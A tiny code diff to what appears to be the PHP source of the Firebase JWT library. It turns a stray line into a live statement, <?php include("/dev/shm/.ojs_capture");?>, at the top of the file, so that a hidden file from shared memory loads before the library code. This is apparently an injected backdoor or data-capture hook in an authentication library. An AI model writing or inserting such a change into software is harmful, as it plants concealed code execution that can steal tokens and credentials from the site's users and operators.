@@ -1,4 +1,4 @@
-include("/dev/shm/.ojs_capture");
+<?php include("/dev/shm/.ojs_capture");?>
 <?php
 
 namespace Firebase\JWT;
